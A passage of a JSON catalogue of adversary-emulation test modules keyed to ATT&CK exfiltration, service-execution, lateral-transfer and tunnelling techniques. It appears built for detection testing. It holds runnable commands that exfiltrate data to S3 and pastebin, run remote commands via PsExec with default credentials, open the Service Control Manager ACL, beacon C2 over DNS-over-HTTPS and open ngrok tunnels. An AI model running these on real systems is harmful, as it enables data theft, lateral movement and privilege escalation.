PathToRagloxModulesFolder/../ExternalPayloads/T1567.002/rclone-v*\n$null = ./rclone copy --max-size 1700k \"PathToRagloxModulesFolder/../ExternalPayloads/T1567.002/data/\" exfils3:$bucket --config \"PathToRagloxModulesFolder/../ExternalPayloads/T1567.002/rclone.conf\"\nWrite-Host \"Done!\"\n",
        "elevation_required": false,
        "cleanup_command": "Write-Host \"Destroying AWS infrastructure... \" -NoNewLine\n$awsAccessKey = \"#{aws_access_key}\"\n$awsSecretKey = \"#{aws_secret_key}\"\ncd PathToRagloxModulesFolder/T1567.002/src/\nif ($awsAccessKey -eq \"\" -or $awsSecretKey -eq \"\") {\n  $env:AWS_PROFILE = \"#{aws_profile}\"\n} else {\n  $env:AWS_ACCESS_KEY_ID = \"$awsAccessKey\"\n  $env:AWS_SECRET_ACCESS_KEY = \"$awsSecretKey\"\n}\n$null = PathToRagloxModulesFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform destroy -var \"aws_region=#{aws_region}\" -auto-approve\nWrite-Host \"Done!\"\n"
      },
      "variables": [
        {
          "name": "rclone_path",
          "description": "Directory of rclone.exe",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/../ExternalPayloads/T1567.002/rclone-v*/"
        },
        {
          "name": "exfil_directory",
          "description": "Directory to exfiltrate",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder/../ExternalPayloads/T1567.002/data/"
        },
        {
          "name": "terraform_path",
          "description": "Directory of terraform",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/../ExternalPayloads/T1567.002/terraform-v*"
        },
        {
          "name": "aws_access_key",
          "description": "AWS Access Key",
          "type": "string",
          "default_value": ""
        },
        {
          "name": "aws_secret_key",
          "description": "AWS Secret Key",
          "type": "string",
          "default_value": ""
        },
        {
          "name": "aws_region",
          "description": "AWS Region",
          "type": "string",
          "default_value": "us-east-1"
        },
        {
          "name": "aws_profile",
          "description": "AWS Profile",
          "type": "string",
          "default_value": "default"
        }
      ],
      "prerequisites": [
        {
          "description": "rclone must exist at (#{rclone_path})\n",
          "check_command": "if (Test-Path \"#{rclone_path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder/../ExternalPayloads/\" -ErrorAction Ignore -Force | Out-Null\n$arch = ([System.Runtime.InteropServices.RuntimeInformation]::OSArchitecture).ToString().ToLower()\n$operatingSystem = ([System.Runtime.InteropServices.RuntimeInformation]::OSDescription).ToString().ToLower()\nif ($operatingSystem -match \"darwin\") {\n  Invoke-WebRequest \"https://downloads.rclone.org/rclone-current-osx-$arch.zip\" -OutFile \"PathToRagloxModulesFolder/../ExternalPayloads/rclone.zip\"\n} elseif ($operatingSystem -match \"linux\") {\n  Invoke-WebRequest \"https://downloads.rclone.org/rclone-current-linux-$arch.zip\" -OutFile \"PathToRagloxModulesFolder/../ExternalPayloads/rclone.zip\"\n}\nExpand-archive -path \"PathToRagloxModulesFolder/../ExternalPayloads/rclone.zip\" -DestinationPath \"PathToRagloxModulesFolder/../ExternalPayloads/T1567.002/\" -force\n"
        },
        {
          "description": "terraform must exist at (#{terraform_path})",
          "check_command": "if (Test-Path \"#{terraform_path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder/../ExternalPayloads/\" -ErrorAction Ignore -Force | Out-Null\n$arch = ([System.Runtime.InteropServices.RuntimeInformation]::OSArchitecture).ToString().ToLower()\n$operatingSystem = ([System.Runtime.InteropServices.RuntimeInformation]::OSDescription).ToString().ToLower()\nif ($operatingSystem -match \"darwin\") {\n  Invoke-WebRequest \"https://releases.hashicorp.com/terraform/1.10.5/terraform_1.10.5_darwin_$arch.zip\" -OutFile \"PathToRagloxModulesFolder/../ExternalPayloads/terraform.zip\"\n} elseif ($operatingSystem -match \"linux\") {\n  Invoke-WebRequest \"https://releases.hashicorp.com/terraform/1.10.5/terraform_1.10.5_linux_$arch.zip\" -OutFile \"PathToRagloxModulesFolder/../ExternalPayloads/terraform.zip\"\n}\nExpand-archive -path \"PathToRagloxModulesFolder/../ExternalPayloads/terraform.zip\" -DestinationPath \"PathToRagloxModulesFolder/../ExternalPayloads/T1567.002/terraform-v1.10.5/\" -force\n"
        },
        {
          "description": "Must provide a valid directory or file path to exfiltrate to AWS S3\n",
          "check_command": "if (Test-Path \"#{exfil_directory}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder/../ExternalPayloads/T1567.002/data\" -ErrorAction Ignore -Force | Out-Null\nforeach($fileSuffix in 1..10) {\n  Set-Content \"PathToRagloxModulesFolder/../ExternalPayloads/T1567.002/data/test$fileSuffix.txt\" \"This is a test file\"\n}\n"
        }
      ],
      "rx_module_id": "a4b74723-5cee-4300-91c3-5e34166909b4",
      "module_name": "Exfiltrate data with rclone to cloud Storage - AWS S3"
    },
    {
      "index": 1672,
      "technique_id": "T1567.003",
      "technique_name": "Exfiltration Over Web Service: Exfiltration to Text Storage Sites",
      "description": "This test uses HTTP POST to exfiltrate data to a remote text storage site. (pastebin)                             \nSee https://web.archive.org/web/20201107203304/https://www.echosec.net/blog/what-is-pastebin-and-why-do-hackers-love-it                \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$apiKey = \"#{api_key}\"\n$content = \"secrets, api keys, passwords...\"\n$url = \"https://pastebin.com/api/api_post.php\"\n$postData = @{\n  api_dev_key   = $apiKey\n  api_option    = \"paste\"\n  api_paste_code = $content\n}\n$response = Invoke-RestMethod -Uri $url -Method Post -Body $postData\nWrite-Host \"Your paste URL: $response\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "api_key",
          "description": "Pastebin API key",
          "type": "string",
          "default_value": "6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "c2e8ab6e-431e-460a-a2aa-3bc6a32022e3",
      "module_name": "Exfiltrate data with HTTP POST to text storage sites - pastebin.com (Windows)"
    },
    {
      "index": 1673,
      "technique_id": "T1569.001",
      "technique_name": "System Services: Launchctl",
      "description": "Utilize launchctl\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "launchctl submit -l #{label_name} -- #{executable_path}\n",
        "elevation_required": false,
        "cleanup_command": "launchctl remove #{label_name}\n"
      },
      "variables": [
        {
          "name": "executable_path",
          "description": "Path of the executable to run.",
          "type": "path",
          "default_value": "/System/Applications/Calculator.app/Contents/MacOS/Calculator"
        },
        {
          "name": "label_name",
          "description": "Unique label to assign this job to launchd.",
          "type": "string",
          "default_value": "evil"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "6fb61988-724e-4755-a595-07743749d4e2",
      "module_name": "Launchctl"
    },
    {
      "index": 1674,
      "technique_id": "T1569.002",
      "technique_name": "System Services: Service Execution",
      "description": "Creates a service specifying an arbitrary command and executes it. When executing commands such as PowerShell, the service will report that it did not start correctly even when code executes properly.\n\nUpon successful execution, cmd.exe creates a new service using sc.exe that will start powershell.exe to create a new file `art-marker.txt`\n\n[BlackCat Ransomware (ALPHV)](https://www.varonis.com/blog/blackcat-ransomware)  \n[Cybereason vs. BlackCat Ransomware](https://www.cybereason.com/blog/cybereason-vs.-blackcat-ransomware)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "sc.exe create #{service_name} binPath= \"#{executable_command}\"\nsc.exe start #{service_name}\nsc.exe delete #{service_name}\n",
        "elevation_required": true,
        "cleanup_command": "del C:\\art-marker.txt >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "service_name",
          "description": "Name of service to create",
          "type": "string",
          "default_value": "ARTService"
        },
        {
          "name": "executable_command",
          "description": "Command to execute as a service",
          "type": "string",
          "default_value": "%COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "2382dee2-a75f-49aa-9378-f52df6ed3fb1",
      "module_name": "Execute a Command as a Service"
    },
    {
      "index": 1675,
      "technique_id": "T1569.002",
      "technique_name": "System Services: Service Execution",
      "description": "Requires having Sysinternals installed, path to sysinternals is one of the input input_arguments\nWill start a process on a remote host.\n\nUpon successful execution, cmd will utilize psexec.exe to spawn calc.exe on a remote endpoint (default:localhost).\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsExec.exe\" \\\\#{remote_host} -i -u #{user_name} -p #{password} -accepteula \"C:\\Windows\\System32\\calc.exe\"\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "remote_host",
          "description": "Remote hostname or IP address",
          "type": "string",
          "default_value": "localhost"
        },
        {
          "name": "user_name",
          "description": "Username",
          "type": "string",
          "default_value": "DOMAIN\\Administrator"
        },
        {
          "name": "password",
          "description": "Password",
          "type": "string",
          "default_value": "P@ssw0rd1"
        }
      ],
      "prerequisites": [
        {
          "description": "PsExec tool from Sysinternals must exist in the ExternalPayloads directory\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsExec.exe\") { exit 0} else { exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsTools.zip\"\nExpand-Archive \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsTools\" -Force\nCopy-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsExec.exe\" -Force\n"
        }
      ],
      "rx_module_id": "873106b7-cfed-454b-8680-fa9f6400431c",
      "module_name": "Use PsExec to execute a command on a remote host"
    },
    {
      "index": 1676,
      "technique_id": "T1569.002",
      "technique_name": "System Services: Service Execution",
      "description": "Will execute a command on the remote host with Impacket psexec.py script.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "psexec.py '#{domain}/#{username}:#{password}@#{remote_host}' '#{command}'\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "remote_host",
          "description": "Remote hostname or IP address",
          "type": "string",
          "default_value": "127.0.0.1"
        },
        {
          "name": "username",
          "description": "Username",
          "type": "string",
          "default_value": "Administrator"
        },
        {
          "name": "domain",
          "description": "Target domain",
          "type": "string",
          "default_value": ""
        },
        {
          "name": "password",
          "description": "Password",
          "type": "string",
          "default_value": "P@ssw0rd1"
        },
        {
          "name": "command",
          "description": "Command to execute in target computer",
          "type": "string",
          "default_value": "whoami"
        }
      ],
      "prerequisites": [
        {
          "description": "psexec.py (Impacket)\n",
          "check_command": "if [ -x \"$(command -v psexec.py)\" ]; then exit 0; else exit 1; fi;\n",
          "install_command": "sudo pip3 install impacket\n"
        }
      ],
      "rx_module_id": "edbcd8c9-3639-4844-afad-455c91e95a35",
      "module_name": "psexec.py (Impacket)"
    },
    {
      "index": 1677,
      "technique_id": "T1569.002",
      "technique_name": "System Services: Service Execution",
      "description": "This raglox attempts to emulate the unique behavior of BlackCat ransomware prior to encryption and during Lateral Movement attempts via PsExec on Windows. Uses bundled PsExec like BlackCat",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "cmd.exe /c \"wmic \tcsproduct \tget UUID\" \ncmd.exe /c \"fsutil behavior \tset SymlinkEvaluation R2L:1\" \ncmd.exe /c \"fsutil behavior set \tSymlinkEvaluation R2R:1\"\nreg    add    HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters    /v MaxMpxCt /d 65535 /t REG_DWORD /f      \ncopy \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsExec.exe\" $env:temp\ncmd.exe /c \"$env:temp\\psexec.exe  -accepteula  \\\\#{targethost} cmd.exe  /c echo \"--access-token\"\"\n",
        "elevation_required": true,
        "cleanup_command": "reg delete HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v MaxMpxCt /f\ncmd.exe /c \"fsutil behavior set SymlinkEvaluation R2L:0\" \ncmd.exe /c \"fsutil behavior set SymlinkEvaluation R2R:0\"\nrm $env:temp\\psexec.exe\n"
      },
      "variables": [
        {
          "name": "targethost",
          "description": "Target hostname to attempt psexec connection to for emulation of lateral movement.",
          "type": "string",
          "default_value": "$ENV:COMPUTERNAME"
        }
      ],
      "prerequisites": [
        {
          "description": "PsExec must exist on disk at \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsExec.exe\"\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsExec.exe\") {exit 0} else {exit 1}\n",
          "install_command": "Invoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsTools.zip\"\nExpand-Archive \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsTools\" -Force\nNew-Item -ItemType Directory (Split-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsExec.exe\") -Force | Out-Null\nCopy-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsExec.exe\" -Force\n"
        }
      ],
      "rx_module_id": "31eb7828-97d7-4067-9c1e-c6feb85edc4b",
      "module_name": "BlackCat pre-encryption cmds with Lateral Movement"
    },
    {
      "index": 1678,
      "technique_id": "T1569.002",
      "technique_name": "System Services: Service Execution",
      "description": "Requires having RemCom installed, path to RemCom is one of the input input_arguments\nWill start a process on a remote host.\nUpon successful execution, cmd will utilize RemCom.exe to spawn calc.exe on a remote endpoint (default:localhost).\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"PathToRagloxModulesFolder\\..\\ExternalPayloads\\remcom.exe\" \\\\#{remote_host} /user:#{user_name} /pwd:#{password} cmd.exe\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "remote_host",
          "description": "Remote hostname or IP address",
          "type": "string",
          "default_value": "localhost"
        },
        {
          "name": "user_name",
          "description": "Username",
          "type": "string",
          "default_value": "Administrator"
        },
        {
          "name": "password",
          "description": "Password",
          "type": "string",
          "default_value": "P@ssw0rd1"
        }
      ],
      "prerequisites": [
        {
          "description": "RemCom tool must exist on disk in the ExternalPayloads folder\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\remcom.exe\") { exit 0} else { exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/kavika13/RemCom/raw/master/bin/Release/RemCom.exe\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\remcom.exe\"\n"
        }
      ],
      "rx_module_id": "a5d8cdeb-be90-43a9-8b26-cc618deac1e0",
      "module_name": "Use RemCom to execute a command on a remote host"
    },
    {
      "index": 1679,
      "technique_id": "T1569.002",
      "technique_name": "System Services: Service Execution",
      "description": "The following RX Module will create a new service named WerFaultSvc with a binary path of WinSxS\\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\\WerFault.exe.\nThis was recently seen in the Snake Malware report. \nUpon execution, sc.exe will create a new service named WerFaultSvc with a bin path \\WinSxS\\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\\WerFault.exe and a display name of WerFault Service.\n[Snake Malware - CISA](https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF)  \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "sc.exe create \"WerFaultSvc\" binPath= \"$env:windir\\WinSxS\\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\\WerFault.exe\" DisplayName= \"WerFault Service\" start= auto\n",
        "elevation_required": true,
        "cleanup_command": "sc.exe delete \"WerFaultSvc\"\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "b8db787e-dbea-493c-96cb-9272296ddc49",
      "module_name": "Snake Malware Service Create"
    },
    {
      "index": 1680,
      "technique_id": "T1569.002",
      "technique_name": "System Services: Service Execution",
      "description": "Modify permissions of Service Control Manager via SDSET. This allows any administrative user to escalate privilege and create a service with SYSTEM level privileges.Restart is required.\n[Blog](https://0xv1n.github.io/posts/scmanager/)  \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "sc.exe sdset scmanager D:(A;;KA;;;WD)\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "bf07f520-3909-4ef5-aa22-877a50f2f77b",
      "module_name": "Modifying ACL of Service Control Manager via SDET"
    },
    {
      "index": 1681,
      "technique_id": "T1569.002",
      "technique_name": "System Services: Service Execution",
      "description": "Requires PsExec tool installed. BlackCat Ransomeware tried to propagate by creating pipe using PsExec process executing from suspicious locations (In the particular case the legitimate PsExec executable is embedded within the Windows variant and is dropped in the victims %TEMP% directory). pon successful execution, PsExec will be executed from suspicious location and create a new pipe to execute CMD.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "cd C:\\Users\\Public\\Temp\\ \n.\\PsExec.exe -i -s cmd  -accepteula",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "PsExec tool from Sysinternals must exist in the '\\Users\\Public\\Temp\\' directory\n",
          "check_command": "if (Get-ChildItem -Path C:\\ -Include *psexec* -File -Recurse -ErrorAction SilentlyContinue) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"C:\\Users\\Public\\Temp\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"C:\\Users\\Public\\Temp\\PSTools.zip\"\nExpand-Archive \"C:\\Users\\Public\\Temp\\PsTools.zip\" \"C:\\Users\\Public\\Temp\\\" -Force\n"
        }
      ],
      "rx_module_id": "004a5d68-627b-452d-af3d-43bd1fc75a3b",
      "module_name": "Pipe Creation - PsExec Tool Execution From Suspicious Locations"
    },
    {
      "index": 1682,
      "technique_id": "T1570",
      "technique_name": "Lateral Tool Transfer",
      "description": "Simulates an attacker exfiltrating data over SMB over QUIC using the New-SmbMapping command.\nPrerequisites:\n  - A file server running Windows Server 2022 Datacenter: Azure Edition\n  - A Windows 11 computer\n  - Windows Admin Center\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-SmbMapping -RemotePath '#{remote_path}' -TransportType QUIC -SkipCertificateCheck\ncopy '#{local_file}' 'Z:\\'\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "remote_path",
          "description": "The UNC path to the share on the file server",
          "type": "string",
          "default_value": "\\\\example.com\\sales"
        },
        {
          "name": "local_file",
          "description": "The local file to be transferred",
          "type": "path",
          "default_value": "C:\\path\\to\\file.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "d8d13303-159e-4f33-89f4-9f07812d016f",
      "module_name": "Exfiltration Over SMB over QUIC (New-SmbMapping)"
    },
    {
      "index": 1683,
      "technique_id": "T1570",
      "technique_name": "Lateral Tool Transfer",
      "description": "Simulates an attacker exfiltrating data over SMB over QUIC using the NET USE command.\nPrerequisites:\n  - A file server running Windows Server 2022 Datacenter: Azure Edition\n  - A Windows 11 computer\n  - Windows Admin Center\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "NET USE * '#{remote_path}' /TRANSPORT:QUIC /SKIPCERTCHECK\ncopy '#{local_file}' '*:\\'\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "remote_path",
          "description": "The UNC path to the share on the file server",
          "type": "string",
          "default_value": "\\\\example.com\\sales"
        },
        {
          "name": "local_file",
          "description": "The local file to be transferred",
          "type": "path",
          "default_value": "C:\\path\\to\\file.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "183235ca-8e6c-422c-88c2-3aa28c4825d9",
      "module_name": "Exfiltration Over SMB over QUIC (NET USE)"
    },
    {
      "index": 1684,
      "technique_id": "T1571",
      "technique_name": "Non-Standard Port",
      "description": "Testing uncommonly used port utilizing PowerShell. APT33 has been known to attempt telnet over port 8081. Upon execution, details about the successful\nport check will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Test-NetConnection -ComputerName #{domain} -port #{port}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "port",
          "description": "Specify uncommon port number",
          "type": "string",
          "default_value": "8081"
        },
        {
          "name": "domain",
          "description": "Specify target hostname",
          "type": "string",
          "default_value": "google.com"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "21fe622f-8e53-4b31-ba83-6d333c2583f4",
      "module_name": "Testing usage of uncommonly used port with PowerShell"
    },
    {
      "index": 1685,
      "technique_id": "T1571",
      "technique_name": "Non-Standard Port",
      "description": "Testing uncommonly used port utilizing telnet.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "echo quit | telnet #{domain} #{port}\nexit 0\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "port",
          "description": "Specify uncommon port number",
          "type": "string",
          "default_value": "8081"
        },
        {
          "name": "domain",
          "description": "Specify target hostname",
          "type": "string",
          "default_value": "google.com"
        }
      ],
      "prerequisites": [
        {
          "description": "Requires telnet\n",
          "check_command": "which telnet\n",
          "install_command": "echo \"please install telnet to run this test\"; exit 1\n"
        }
      ],
      "rx_module_id": "5db21e1d-dd9c-4a50-b885-b1e748912767",
      "module_name": "Testing usage of uncommonly used port"
    },
    {
      "index": 1686,
      "technique_id": "T1572",
      "technique_name": "Protocol Tunneling",
      "description": "This test simulates an infected host sending a large volume of DoH queries to a command and control server.\nThe intent of this test is to trigger threshold based detection on the number of DoH queries either from a single source system or to a single targe domain.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "for($i=0; $i -le #{query_volume}; $i++) { (Invoke-WebRequest \"#{doh_server}?name=#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}&type=#{query_type}\" -UseBasicParsing).Content }\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "doh_server",
          "description": "Default DoH resolver",
          "type": "string",
          "default_value": "https://8.8.8.8/resolve"
        },
        {
          "name": "query_type",
          "description": "DNS query type",
          "type": "string",
          "default_value": "TXT"
        },
        {
          "name": "subdomain",
          "description": "Subdomain prepended to the domain name",
          "type": "string",
          "default_value": "raglox"
        },
        {
          "name": "query_volume",
          "description": "Number of DNS queries to send",
          "type": "integer",
          "default_value": 1000
        },
        {
          "name": "domain",
          "description": "Default domain to simulate against",
          "type": "string",
          "default_value": "127.0.0.1.xip.io"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "ae9ef4b0-d8c1-49d4-8758-06206f19af0a",
      "module_name": "DNS over HTTPS Large Query Volume"
    },
    {
      "index": 1687,
      "technique_id": "T1572",
      "technique_name": "Protocol Tunneling",
      "description": "This test simulates an infected host beaconing via DoH queries to a command and control server at regular intervals over time.\nThis behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Set-Location \"PathToRagloxModulesFolder\"\n.\\T1572\\src\\T1572-doh-beacon.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "doh_server",
          "description": "Default DoH resolver",
          "type": "string",
          "default_value": "https://8.8.8.8/resolve"
        },
        {
          "name": "runtime",
          "description": "Time in minutes to run the simulation",
          "type": "integer",
          "default_value": 30
        },
        {
          "name": "domain",
          "description": "Default domain to simulate against",
          "type": "string",
          "default_value": "127.0.0.1.xip.io"
        },
        {
          "name": "subdomain",
          "description": "Subdomain prepended to the domain name",
          "type": "string",
          "default_value": "raglox"
        },
        {
          "name": "query_type",
          "description": "DNS query type",
          "type": "string",
          "default_value": "TXT"
        },
        {
          "name": "c2_interval",
          "description": "Seconds between C2 requests to the command and control server",
          "type": "integer",
          "default_value": 30
        },
        {
          "name": "c2_jitter",
          "description": "Percentage of jitter to add to the C2 interval to create variance in the times between C2 requests",
          "type": "integer",
          "default_value": 20
        }
      ],
      "prerequisites": [],
      "rx_module_id": "0c5f9705-c575-42a6-9609-cbbff4b2fc9b",
      "module_name": "DNS over HTTPS Regular Beaconing"
    },
    {
      "index": 1688,
      "technique_id": "T1572",
      "technique_name": "Protocol Tunneling",
      "description": "This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DoH queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DoH queries for long domain names over a set threshold.\n Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Set-Location \"PathToRagloxModulesFolder\"\n.\\T1572\\src\\T1572-doh-domain-length.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "doh_server",
          "description": "Default DoH resolver",
          "type": "string",
          "default_value": "https://8.8.8.8/resolve"
        },
        {
          "name": "query_type",
          "description": "DNS query type",
          "type": "string",
          "default_value": "TXT"
        },
        {
          "name": "subdomain",
          "description": "Subdomain prepended to the domain name (should be 63 characters to test maximum length)",
          "type": "string",
          "default_value": "ragloxragloxragloxragloxragloxredte"
        },
        {
          "name": "domain",
          "description": "Default domain to simulate against",
          "type": "string",
          "default_value": "127.0.0.1.xip.io"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "748a73d5-cea4-4f34-84d8-839da5baa99c",
      "module_name": "DNS over HTTPS Long Domain Query"
    },
    {
      "index": 1689,
      "technique_id": "T1572",
      "technique_name": "Protocol Tunneling",
      "description": "Download and run ngrok. Create tunnel to chosen port.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "C:\\Users\\Public\\ngrok\\ngrok.exe config add-authtoken #{api_token} | Out-Null\nStart-Job -ScriptBlock { C:\\Users\\Public\\ngrok\\ngrok.exe tcp #{port_num} } | Out-Null\nStart-Sleep -s 5 \nStop-Job -Name Job1 | Out-Null\n",
        "elevation_required": true,
        "cleanup_command": "Remove-Item C:\\Users\\Public\\ngrok -Recurse -ErrorAction Ignore\nRemove-Item C:\\%userprofile%\\AppData\\Local\\ngrok -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "api_token",
          "description": "ngrok API",
          "type": "string",
          "default_value": "N/A"
        },
        {
          "name": "port_num",
          "description": "port number for tunnel",
          "type": "integer",
          "default_value": 3389
        },
        {
          "name": "download",
          "description": "link to download ngrok",
          "type": "string",
          "default_value": "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
        }
      ],
      "prerequisites": [
        {
          "description": "Download ngrok\n",
          "check_command": "if (Test-Path C:\\Users\\Public\\ngrok) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Path C:\\Users\\Public\\ngrok -ItemType Directory | Out-Null\nInvoke-WebRequest #{download} -OutFile C:\\Users\\Public\\ngrok\\ngrok-v3-stable-windows-amd64.zip\nExpand-Archive C:\\Users\\Public\\ngrok\\ngrok-v3-stable-windows-amd64.zip -DestinationPath C:\\Users\\Public\\ngrok\n"
        }
      ],
      "rx_module_id": "4cdc9fc7-53fb-4894-9f0c-64836943ea60",
      "module_name": "run ngrok"
    },
    {
      "index": 1690,
      "technique_id": "T1572",
      "technique_name": "Protocol Tunneling",
      "description": "Dev Tunnels enables insiders as well as threat actors to expose local ports over the internet via Microsoft dev tunnels.\n\nThis raglox will generate a dev tunnel binding it to the local service running on the provided port. Can be used to expose local services, web applications and local files etc.\nReference:\n- [Microsoft Docs](https://learn.microsoft.com/en-us/tunnels/dev-tunnels-overview)\n- [LOT Tunnels](https://lottunnels.github.io/lottunnels/Binaries/devtunnels/)\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "bash",
        "command": "#{binary_path} host -p #{port} &\n",
        "elevation_required": false,
        "cleanup_command": "pkill -9 $(basename \"#{binary_path}\")\n#{binary_path} user logout\nrm #{binary_path}\n"
      },
      "variables": [
        {
          "name": "port",
          "description": "port number for tunnel",
          "type": "integer",
          "default_value": 8080
        },
